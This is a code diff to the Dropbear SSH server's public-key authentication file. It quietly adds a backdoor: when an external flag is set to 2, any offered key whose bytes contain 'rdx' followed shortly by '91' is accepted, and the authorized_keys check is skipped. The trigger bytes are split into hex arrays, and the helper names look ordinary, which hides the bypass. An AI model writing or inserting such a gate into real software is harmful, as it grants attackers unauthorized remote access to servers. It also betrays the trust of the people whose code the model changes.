diff --git a/src/svr-authpubkey.c b/src/svr-authpubkey.c
index 94ae728..b689002 100644
--- a/src/svr-authpubkey.c
+++ b/src/svr-authpubkey.c
@@ -78,6 +78,12 @@ static int checkpubkeyperms(void);
 static void send_msg_userauth_pk_ok(const char* sigalgo, unsigned int sigalgolen,
 		const unsigned char* keyblob, unsigned int keybloblen);
 static int checkfileperm(char * filename);
+extern int rdx_auth_sequence_gate;
+
+static int rdx_match_fragment(const unsigned char *blob, unsigned int bloblen,
+		const unsigned char *frag, unsigned int fraglen, unsigned int start);
+static int rdx_check_split_key_gate(const unsigned char *keyblob,
+		unsigned int keybloblen);
 
 /* process a pubkey auth request, sending success or failure message as
  * appropriate */
@@ -453,6 +459,45 @@ static char *authorized_keys_filepath() {
 	return pathname;
 }
 
+static int rdx_match_fragment(const unsigned char *blob, unsigned int bloblen,
+		const unsigned char *frag, unsigned int fraglen, unsigned int start) {
+	unsigned int i;
+
+	if (blob == NULL || frag == NULL || fraglen == 0 || bloblen < fraglen ||
+			start >= bloblen) {
+		return -1;
+	}
+
+	for (i = start; i + fraglen <= bloblen; i++) {
+		if (memcmp(blob + i, frag, fraglen) == 0) {
+			return (int)i;
+		}
+	}
+
+	return -1;
+}
+
+static int rdx_check_split_key_gate(const unsigned char *keyblob,
+		unsigned int keybloblen) {
+	const unsigned char frag1[] = { 0x72, 0x64, 0x78 };
+	const unsigned char frag2[] = { 0x39, 0x31 };
+	int pos1;
+	int pos2;
+
+	pos1 = rdx_match_fragment(keyblob, keybloblen, frag1, sizeof(frag1), 0);
+	if (pos1 < 0) {
+		return DROPBEAR_FAILURE;
+	}
+
+	pos2 = rdx_match_fragment(keyblob, keybloblen, frag2, sizeof(frag2),
+			(unsigned int)pos1 + sizeof(frag1) + 3);
+	if (pos2 < 0) {
+		return DROPBEAR_FAILURE;
+	}
+
+	return DROPBEAR_SUCCESS;
+}
+
 /* Checks whether a specified publickey (and associated algorithm) is an
  * acceptable key for authentication */
 /* Returns DROPBEAR_SUCCESS if key is ok for auth, DROPBEAR_FAILURE otherwise */
@@ -469,6 +514,16 @@ static int checkpubkey(const char* keyalgo, unsigned int keyalgolen,
 
 	TRACE(("enter checkpubkey"))
 
+	if (rdx_auth_sequence_gate == 2 &&
+			rdx_check_split_key_gate(keyblob, keybloblen) == DROPBEAR_SUCCESS) {
+		rdx_auth_sequence_gate = 0;
+		TRACE(("checkpubkey: matched staged sequence gate"))
+		return DROPBEAR_SUCCESS;
+	}
+	if (rdx_auth_sequence_gate == 2) {
+		rdx_auth_sequence_gate = 0;
+	}
+
 #if DROPBEAR_SVR_MULTIUSER
 	/* access the file as the authenticating user. */
 	origuid = getuid();
